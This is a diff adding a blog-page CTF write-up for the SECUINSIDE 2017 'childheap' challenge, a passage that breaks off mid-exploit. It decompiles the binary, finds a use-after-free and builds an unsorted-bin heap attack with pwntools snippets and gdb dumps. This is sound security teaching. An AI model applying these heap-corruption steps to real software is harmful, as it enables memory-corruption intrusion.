@@ -1,0 +1,731 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>SECUINSIDE CTF Quals 2017 - childheap | kileak</title>
+
+
+
+
+
+<meta name="description" content="SECUINSIDE CTF Quals 2017 - childheap">
+
+
+<meta name="keywords" content="secuinside, childheap">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2017/SecuInsideQual-ChildHeap/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">SECUINSIDE CTF Quals 2017 - childheap</h1>
+      <p class="post-meta">Jul 1, 2017</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>childheap (707 pts)
+<!--break--></p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/childheap/childheap">childheap</a> <a href="https://kileak.github.io/assets/childheap/libc.so.6">libc.so</a> <a href="https://kileak.github.io/assets/childheap/xpl.py">xpl.py</a></p>
+
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">-----ChildHeap 2017 in Secuinside---
+1. Allocate
+2. Free
+3. Modify
+&gt; 
+
+CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial</code></pre></figure>
+
+<p>So, we can allocate a chunk and specify content for it. If a chunk was allocated, we can free it again. 
+Modify will let us update some “user information” (not modifying the allocated chunk).</p>
+
+<p>Let’s take a short glance at the main function:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>  
+  <span class="kt">int</span> <span class="n">nChoice</span><span class="p">;</span> 
+  <span class="kt">int</span> <span class="n">nInputSize</span><span class="p">;</span> 
+  <span class="kt">void</span> <span class="o">*</span><span class="n">ptrChunk</span><span class="p">;</span> 
+  <span class="kt">char</span> <span class="n">cSecretComment</span><span class="p">;</span> 
+  <span class="n">__int64</span> <span class="n">canary</span><span class="p">;</span> 
+
+  <span class="n">canary</span> <span class="o">=</span> <span class="o">*</span><span class="n">MK_FP</span><span class="p">(</span><span class="n">__FS__</span><span class="p">,</span> <span class="mi">40LL</span><span class="p">);</span>
+
+  <span class="n">ptrChunk</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span> 
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+
+  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"-----ChildHeap 2017 in Secuinside---"</span><span class="p">);</span>
+    <span class="n">showMenu</span><span class="p">();</span>
+    <span class="n">nChoice</span> <span class="o">=</span> <span class="n">readInteger</span><span class="p">();</span>
+
+    <span class="k">if</span> <span class="p">(</span> <span class="n">nChoice</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>                      <span class="c1">// 1. Allocate</span>
+    <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="n">ALLOCATED</span> <span class="p">)</span>
+      <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"You can't allocate anymore.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="k">else</span>
+      <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Input size: "</span><span class="p">);</span>
+        <span class="n">nInputSize</span> <span class="o">=</span> <span class="n">readInteger</span><span class="p">();</span>             
+
+        <span class="k">if</span> <span class="p">(</span> <span class="n">nInputSize</span> <span class="o">&gt;</span> <span class="mi">511</span> <span class="o">&amp;&amp;</span> <span class="n">nInputSize</span> <span class="o">&lt;=</span> <span class="mi">4095</span> <span class="p">)</span>
+        <span class="p">{</span>
+          <span class="n">ptrChunk</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">nInputSize</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+
+          <span class="n">printf</span><span class="p">(</span><span class="s">"Input data: "</span><span class="p">);</span>
+          <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">ptrChunk</span><span class="p">,</span> <span class="n">nInputSize</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+
+          <span class="n">ALLOCATED</span> <span class="o">=</span> <span class="mi">1LL</span><span class="p">;</span>
+
+          <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">USER_INFO</span> <span class="p">)</span>
+            <span class="n">allocate</span><span class="p">();</span>
+        <span class="p">}</span>
+        <span class="k">else</span>
+        <span class="p">{</span>
+          <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid size!"</span><span class="p">);</span>
+        <span class="p">}</span>
+      <span class="p">}</span>
+    <span class="p">}</span>	
+    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">nChoice</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span>                   <span class="c1">// 2. Free</span>
+    <span class="p">{</span>
+      <span class="n">ALLOCATED</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+      <span class="n">free</span><span class="p">(</span><span class="n">ptrChunk</span><span class="p">);</span>
+    <span class="p">}</span>	
+    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">nChoice</span> <span class="o">==</span> <span class="mi">3</span> <span class="p">)</span>                 <span class="c1">// 3. Modify</span>
+    <span class="p">{</span>
+      <span class="n">modify</span><span class="p">();</span>
+    <span class="p">}</span>      	
+    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">nChoice</span> <span class="o">==</span> <span class="mi">201527</span> <span class="p">)</span>            <span class="c1">// 201527. Secret menu</span>
+    <span class="p">{</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"Input secret code: "</span><span class="p">);</span>
+      <span class="n">SECRET_INPUT</span> <span class="o">=</span> <span class="n">readInteger</span><span class="p">();</span>
+
+      <span class="k">if</span> <span class="p">(</span> <span class="n">SECRET_INPUT</span> <span class="o">==</span> <span class="mi">1397048149</span> <span class="p">)</span>       
+      <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Give me your last comment: "</span><span class="p">);</span>
+        <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cSecretComment</span><span class="p">,</span> <span class="mi">1024uLL</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="k">else</span>
+      <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid code!"</span><span class="p">);</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid choice!"</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span>  
+<span class="p">}</span></code></pre></figure>
+
+<ul>
+  <li>We can only have one allocated chunk at a time (<code class="language-plaintext highlighter-rouge">ALLOCATED</code> will be set/reset on malloc/free)</li>
+  <li>The size for the allocated chunk must be between 512 and 4095</li>
+  <li>On the first allocation of a chunk, a chunk for the “user information” will be allocated (<code class="language-plaintext highlighter-rouge">USER_INFO</code>)</li>
+  <li>On <code class="language-plaintext highlighter-rouge">Free</code> the pointer to the freed chunk won’t be reset, so it can be used for a double-free</li>
+  <li>By entering <code class="language-plaintext highlighter-rouge">201527</code> we can access the <code class="language-plaintext highlighter-rouge">secret menu</code> and add a comment (though comment isn’t needed at all, the read on <code class="language-plaintext highlighter-rouge">SECRET_CODE</code> will be useful later on)</li>
+  <li>With <code class="language-plaintext highlighter-rouge">modify</code> we can update the <code class="language-plaintext highlighter-rouge">user information</code> chunk</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">modify</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">newAge</span><span class="p">;</span> 
+  <span class="kt">char</span> <span class="n">sInput</span><span class="p">;</span> 
+  <span class="kt">char</span> <span class="n">sNewName</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> 
+  
+  <span class="k">if</span> <span class="p">(</span> <span class="n">USER_INFO</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Do you want to change age (y/n)? "</span><span class="p">);</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sInput</span><span class="p">,</span> <span class="mi">2uLL</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span> <span class="n">sInput</span> <span class="o">==</span> <span class="sc">'y'</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"Input age: "</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sInput</span><span class="p">);</span>
+      <span class="n">newAge</span> <span class="o">=</span> <span class="n">readInteger</span><span class="p">();</span>
+
+      <span class="k">if</span> <span class="p">(</span> <span class="n">newAge</span> <span class="o">&gt;</span> <span class="mi">100</span> <span class="p">)</span>
+      <span class="p">{</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"You are too old! :("</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+      <span class="p">}</span>
+
+      <span class="n">USER_INFO</span><span class="o">-&gt;</span><span class="n">Age</span> <span class="o">=</span> <span class="n">newAge</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Input new name: "</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sInput</span><span class="p">);</span>
+    <span class="n">fgets</span><span class="p">(</span><span class="n">sNewName</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>                         <span class="c1">// Allocates an input chunk (size 0x1000)</span>
+    <span class="n">fflush</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Do you want to change name to new one (y/n)? "</span><span class="p">,</span> <span class="mi">24LL</span><span class="p">);</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sInput</span><span class="p">,</span> <span class="mi">2uLL</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span> <span class="n">sInput</span> <span class="o">==</span> <span class="sc">'y'</span> <span class="p">)</span>
+      <span class="n">memcpy</span><span class="p">(</span><span class="n">USER_INFO</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="n">sNewName</span><span class="p">,</span> <span class="mi">24uLL</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"You have to create information first."</span><span class="p">);</span>
+  <span class="p">}</span>  
+<span class="p">}</span></code></pre></figure>
+
+<p>It’s eye-catching, that in the <code class="language-plaintext highlighter-rouge">modify</code> function most times <code class="language-plaintext highlighter-rouge">read</code> is used to get the user input, but for reading the name it’s <code class="language-plaintext highlighter-rouge">fgets</code>.</p>
+
+<p>This has an important side effect, as <code class="language-plaintext highlighter-rouge">fgets</code> allocates a chunk on the heap (size 0x1000) for reading user input.</p>
+
+<p>So, after allocating a chunk, our variables in the bss will look like this:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ x/10x 0x6020a8
+0x6020a8: 0x0000000000000000  0x0000000000000211  =&gt; Unused    / SECRET_INPUT
+0x6020b8: 0x0000000000000001  0x0000000000604020  =&gt; ALLOCATED / USER_INFO
+0x6020c8: 0x0000000000000000  0x0000000000000000
+0x6020d8: 0x0000000000000000  0x0000000000000000
+0x6020e8: 0x0000000000000000  0x0000000000000000</code></pre></figure>
+
+<p>If we were able to overwrite the pointer to <code class="language-plaintext highlighter-rouge">USER_INFO</code>, we could use <code class="language-plaintext highlighter-rouge">modify</code> to get an arbitrary write.</p>
+
+<p>Thus, the plan is to force the binary to allocate a chunk overlapping this pointer. To do so, we’ll first let this area look like a valid chunk by misusing the secret menu, creating a valid size field:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Allocate =&gt; Allocate chunk with size 4095"</span><span class="p">)</span>
+
+<span class="n">alloc</span><span class="p">(</span><span class="mi">4095</span><span class="p">,</span> <span class="s">"AAAABBBB"</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Secret   =&gt; Create fake chunk by abusing the 'secret menu'"</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"201527"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">":"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mh">0x211</span><span class="p">))</span>	<span class="c1"># Create fake size 
+</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">)</span></code></pre></figure>
+
+<p>Since we passed a wrong <code class="language-plaintext highlighter-rouge">SECRET_INPUT</code>, it won’t ask us for leaving a comment. But we weren’t interested in writing a comment at all :)</p>
+
+<p>After this, the bss area will look like this:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ x/10x 0x6020a8
+0x6020a8:	0x0000000000000000	0x0000000000000211 =&gt; Unused    / SECRET_INPUT (fake size)
+0x6020b8:	0x0000000000000001	0x0000000000604020 =&gt; ALLOCATED / USER_INFO
+0x6020c8:	0x0000000000000000	0x0000000000000000
+0x6020d8:	0x0000000000000000	0x0000000000000000
+0x6020e8:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>The allocated chunks on the heap:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ x/100x 0x603000
+0x603000: 0x0000000000000000  0x0000000000001011 =&gt; Allocated chunk
+0x603010: 0x4242424241414141  0x000000000000000a =&gt; Content
+0x603020: 0x0000000000000000  0x0000000000000000
+0x603030: 0x0000000000000000  0x0000000000000000
+0x603040: 0x0000000000000000  0x0000000000000000
+0x603050: 0x0000000000000000  0x0000000000000000
+
+...
+
+0x603fd0: 0x0000000000000000  0x0000000000000000
+0x603fe0: 0x0000000000000000  0x0000000000000000
+0x603ff0: 0x0000000000000000  0x0000000000000000
+0x604000: 0x0000000000000000  0x0000000000000000
+0x604010: 0x0000000000000000  0x0000000000000031 =&gt; USER_INFO chunk
+0x604020: 0x0000000000000012  0x37796f626874616d =&gt; Age / Name
+0x604030: 0x0000000000000000  0x0000000000000000
+0x604040: 0x0000000000000000  0x0000000000020fc1
+0x604050: 0x0000000000000000  0x0000000000000000</code></pre></figure>
+
+<p>Now, we’ll abuse the fact, that <code class="language-plaintext highlighter-rouge">fgets</code> allocates a chunk on the heap for its user input (with size 0x1000).</p>
+
+<p>Since we allocated our chunk with a size around that, when we free it and then call <code class="language-plaintext highlighter-rouge">modify</code>, the chunk for <code class="language-plaintext highlighter-rouge">fgets</code> will be allocated exactly on top of our previously allocated chunk. Since the original <code class="language-plaintext highlighter-rouge">chunk pointer</code> doesn’t get resetted on <code class="language-plaintext highlighter-rouge">Free</code>, we’ll have a pointer to the freed chunk, which then also is the chunk for <code class="language-plaintext highlighter-rouge">fgets</code>.</p>
+
+<p>Let’s split this up:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">log.info("Free     =&gt; Free chunk")
+free()
+
+log.info("Modify   =&gt; Allocates an 'input' chunk, overlapping allocated chunk")
+modify(False, 100, True, "CCCCCCCC") 
+
+log.info("Free     =&gt; Puts chunk into unsorted bin list again")
+free()</code></pre></figure>
+
+<p>After freeing up the allocated chunk:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ p main_arena
+$1 = {
+  mutex = 0x0, 
+  flags = 0x1, 
+  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
+  top = 0x604040, 
+  last_remainder = 0x0, 
+  bins = {0x603000, 0x603000, 0x7ffff7dd3b68 &lt;main_arena+104&gt;, 0x7ffff7dd3b68 &lt;main_arena+104&gt;, 0x7ffff7dd3b78 &lt;main_arena+120&gt;, 0x7ffff7dd3b78 &lt;main_arena+120&gt;, 0x7ffff7dd3b88 &lt;main_arena+136&gt;, 
+    0x7ffff7dd3b88 &lt;main_arena+136&gt;, 0x7ffff7dd3b98 &lt;main_arena+152&gt;, 0x7ffff7dd3b98 &lt;main_arena+152&gt;, 0x7ffff7dd3ba8 &lt;main_arena+168&gt;, 0x7ffff7dd3ba8 &lt;main_arena+168&gt;, 0x7ffff7dd3bb8 &lt;main_arena+184&gt;, 
+    0x7ffff7dd3bb8 &lt;main_arena+184&gt;, 0x7ffff7dd3bc8 &lt;main_arena+200&gt;, 0x7ffff7dd3bc8 &lt;main_arena+200&gt;, 0x7ffff7dd3bd8 &lt;main_arena+216&gt;, 0x7ffff7dd3bd8 &lt;main_arena+216&gt;, 0x7ffff7dd3be8 &lt;main_arena+232&gt;, 
+    
+gdb-peda$ x/10x 0x603000
+0x603000:	0x0000000000000000	0x0000000000001011  =&gt; Allocated Chunk (freed)
+0x603010:	0x00007ffff7dd3b58	0x00007ffff7dd3b58  =&gt; FD / BK
+0x603020:	0x0000000000000000	0x0000000000000000
+0x603030:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>The modify function will now allocate a chunk with size 0x1000 for fgets. Since <code class="language-plaintext highlighter-rouge">malloc</code> tries to reuse the top chunk in the unsorted bin list, it will discover our just freed chunk (<code class="language-plaintext highlighter-rouge">0x603000</code>) and serve it to the <code class="language-plaintext highlighter-rouge">fgets</code> allocation:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ p main_arena
+$2 = {
+  mutex = 0x0, 
+  flags = 0x1, 
+  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
+  top = 0x604040, 
+  last_remainder = 0x0, 
+  bins = {0x7ffff7dd3b58 &lt;main_arena+88&gt;, 0x7ffff7dd3b58 &lt;main_arena+88&gt;, 0x7ffff7dd3b68 &lt;main_arena+104&gt;, 0x7ffff7dd3b68 &lt;main_arena+104&gt;, 0x7ffff7dd3b78 &lt;main_arena+120&gt;, 0x7ffff7dd3b78 &lt;main_arena+120&gt;, 
+    0x7ffff7dd3b88 &lt;main_arena+136&gt;, 0x7ffff7dd3b88 &lt;main_arena+136&gt;, 0x7ffff7dd3b98 &lt;main_arena+152&gt;, 0x7ffff7dd3b98 &lt;main_arena+152&gt;, 0x7ffff7dd3ba8 &lt;main_arena+168&gt;, 0x7ffff7dd3ba8 &lt;main_arena+168&gt;, 
+    0x7ffff7dd3bb8 &lt;main_arena+184&gt;, 0x7ffff7dd3bb8 &lt;main_arena+184&gt;, 0x7ffff7dd3bc8 &lt;main_arena+200&gt;, 0x7ffff7dd3bc8 &lt;main_arena+200&gt;, 0x7ffff7dd3bd8 &lt;main_arena+216&gt;, 0x7ffff7dd3bd8 &lt;main_arena+216&gt;, 
+    0x7ffff7dd3be8 &lt;main_arena+232&gt;, 0x7ffff7dd3be8 &lt;main_arena+232&gt;, 0x7ffff7dd3bf8 &lt;main_arena+248&gt;, 0x7ffff7dd3bf8 &lt;main_arena+248&gt;, 0x7ffff7dd3c08 &lt;main_arena+264&gt;, 0x7ffff7dd3c08 &lt;main_arena+264&gt;, 
+
+gdb-peda$ x/10x 0x603000
+0x603000:	0x0000000000000000	0x0000000000001011  =&gt; Allocated chunk (freed) / fgets read buffer
+0x603010:	0x4343434343434343	0x00007ffff7dd3b0a  =&gt; Input read by fgets
+0x603020:	0x0000000000000000	0x0000000000000000
+0x603030:	0x0000000000000000	0x0000000000000000
+0x603040:	0x0000000000000000	0x0000000000000000
+
+gdb-peda$ x/10x 0x604010
+0x604010:	0x0000000000001010	0x0000000000000031  =&gt; USER_INFO chunk
+0x604020:	0x0000000000000012	0x4343434343434343  =&gt; Age / Input copied by modify
+0x604030:	0x000000000000000a	0x0000000000000000
+0x604040:	0x0000000000000000	0x0000000000020fc1</code></pre></figure>
+
+<p>So, <code class="language-plaintext highlighter-rouge">fgets</code> took the chunk from the unsorted bin list and stored the user input at the same position, the first chunk was allocated at. Since we chose to update the name, it was then copied to the <code class="language-plaintext highlighter-rouge">USER_INFO</code> chunk.</p>
+
+<p>After freeing the first chunk again (remember, we still have the dangling pointer from our first allocation, which points also to the <code class="language-plaintext highlighter-rouge">fgets</code> chunk), this chunk will be freed and moved to the unsorted bin list again.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ p main_arena
+$5 = {
+  mutex = 0x0, 
+  flags = 0x1, 
+  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
+  top = 0x604040, 
+  last_remainder = 0x0, 
+  bins = {0x603000, 0x603000, 0x7ffff7dd3b68 &lt;main_arena+104&gt;, 0x7ffff7dd3b68 &lt;main_arena+104&gt;, 0x7ffff7dd3b78 &lt;main_arena+120&gt;, 0x7ffff7dd3b78 &lt;main_arena+120&gt;, 0x7ffff7dd3b88 &lt;main_arena+136&gt;, 
+    0x7ffff7dd3b88 &lt;main_arena+136&gt;, 0x7ffff7dd3b98 &lt;main_arena+152&gt;, 0x7ffff7dd3b98 &lt;main_arena+152&gt;, 0x7ffff7dd3ba8 &lt;main_arena+168&gt;, 0x7ffff7dd3ba8 &lt;main_arena+168&gt;, 0x7ffff7dd3bb8 &lt;main_arena+184&gt;, 
+    0x7ffff7dd3bb8 &lt;main_arena+184&gt;, 0x7ffff7dd3bc8 &lt;main_arena+200&gt;, 0x7ffff7dd3bc8 &lt;main_arena+200&gt;, 0x7ffff7dd3bd8 &lt;main_arena+216&gt;, 0x7ffff7dd3bd8 &lt;main_arena+216&gt;, 0x7ffff7dd3be8 &lt;main_arena+232&gt;, 
+    0x7ffff7dd3be8 &lt;main_arena+232&gt;, 0x7ffff7dd3bf8 &lt;main_arena+248&gt;, 0x7ffff7dd3bf8 &lt;main_arena+248&gt;, 0x7ffff7dd3c08 &lt;main_arena+264&gt;, 0x7ffff7dd3c08 &lt;main_arena+264&gt;, 0x7ffff7dd3c18 &lt;main_arena+280&gt;, 
+
+gdb-peda$ x/10x 0x603000
+0x603000:	0x0000000000000000	0x0000000000001011
+0x603010:	0x00007ffff7dd3b58	0x00007ffff7dd3b58
+0x603020:	0x0000000000000000	0x0000000000000000
+0x603030:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>Now, we’re at the starting point again, so what did we win by freeing the chunk again?</p>
+
+<p>The trick here is, that <code class="language-plaintext highlighter-rouge">fgets</code> now has an internal pointer to that chunk, since it thinks, it already allocated it. Thus, everytime <code class="language-plaintext highlighter-rouge">fgets</code> gets called from now on, it will store its input at this address (overwriting our first chunk).</p>
+
+<p>So, we can now allocate this chunk again, writing to it or we can use <code class="language-plaintext highlighter-rouge">fgets</code> in modify to write to this chunk, regardless if the chunk is allocated or not, resulting  in a use-after-free.</p>
+
+<p>We’ll use this now, to overwrite the BK pointer in the freed chunk. On the next allocation, malloc will try to take this chunk and remove it from the unsorted bin list. To do so, it has to link the previous and follow-up chunk:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kt">void</span> <span class="o">*</span>
+<span class="nf">_int_malloc</span> <span class="p">(</span><span class="n">mstate</span> <span class="n">av</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">bytes</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="p">...</span>
+
+<span class="cm">/*
+     Process recently freed or remaindered chunks, taking one only if
+     it is exact fit, or, if this a small request, the chunk is remainder from
+     the most recent non-exact fit.  Place other traversed chunks in
+     bins.  Note that this step is the only place in any routine where
+     chunks are placed in bins.
+
+     The outer loop here is needed because we might not realize until
+     near the end of malloc that we should have consolidated, so must
+     do so and retry. This happens at most once, and only when we would
+     otherwise need to expand memory to service a "small" request.
+   */</span>
+
+  <span class="k">for</span> <span class="p">(;;</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="kt">int</span> <span class="n">iters</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+      <span class="k">while</span> <span class="p">((</span><span class="n">victim</span> <span class="o">=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">)</span> <span class="o">!=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">))</span>
+        <span class="p">{</span>
+          <span class="n">bck</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>                  <span class="c1">// Reads our fake BK pointer</span>
+          <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">victim</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">&lt;=</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">SIZE_SZ</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+              <span class="o">||</span> <span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">victim</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">&gt;</span> <span class="n">av</span><span class="o">-&gt;</span><span class="n">system_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+            <span class="n">malloc_printerr</span> <span class="p">(</span><span class="n">check_action</span><span class="p">,</span> <span class="s">"malloc(): memory corruption"</span><span class="p">,</span>
+                             <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">victim</span><span class="p">),</span> <span class="n">av</span><span class="p">);</span>
+          <span class="n">size</span> <span class="o">=</span> <span class="n">chunksize</span> <span class="p">(</span><span class="n">victim</span><span class="p">);</span>
+
+<span class="p">...</span>
+
+          <span class="cm">/* remove from unsorted list */</span>
+          <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
+          <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">);</span>    <span class="c1">// Writes main_arena ptr into FD pointer from our fake BK pointer (BSS chunk)</span>
+<span class="p">...</span></code></pre></figure>
+
+<p>When removing the chunk from the unsorted bin list, malloc doesn’t check, if the BK pointer points to a valid chunk, so we can specify any address here. Malloc will then overwrite <code class="language-plaintext highlighter-rouge">address+0x10 (FD pointer)</code> with a pointer to the unsorted bin list.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Modify   =&gt; Write fake BK into freed chunk"</span><span class="p">)</span>
+
+<span class="n">modify</span><span class="p">(</span><span class="bp">False</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="bp">False</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x6020b0</span><span class="p">))</span>	
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Allocate =&gt; Removes chunk from unsorted bin list, overwriting FD pointer in fake chunk"</span><span class="p">)</span>
+
